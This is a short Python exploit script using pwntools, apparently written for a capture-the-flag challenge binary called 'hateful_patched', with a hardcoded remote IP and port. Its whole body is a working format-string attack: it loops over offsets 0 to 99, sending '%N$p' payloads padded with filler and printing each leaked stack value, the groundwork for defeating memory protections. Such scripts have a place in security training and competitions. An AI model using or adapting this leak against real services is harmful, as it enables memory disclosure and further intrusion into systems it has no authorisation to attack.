#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './hateful_patched'
elf = context.binary = ELF(exe, checksec=True)
libc = elf.libc
context.log_level = 'error'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = '103.145.226.92', 24234

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        context.log_level = 'info'
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
c
'''.format(**locals())


# =========================================================
#                         EXPLOITS
# =========================================================

def exploit(i):
    global io
    io = initialize()
    io.sendlineafter(b">> ", "yay")
    io.sendlineafter(b">> ", (b"%%%d$p" % i).ljust(8, b"\x00") + b"A"*8)
    io.recvuntil("email provided: ")
    leak = io.recvline()
    print("%d - %s" % (i, leak))
#    io.interactive()
    
if __name__ == '__main__':
    for i in range(0, 100):
        exploit(i)
        io.close()
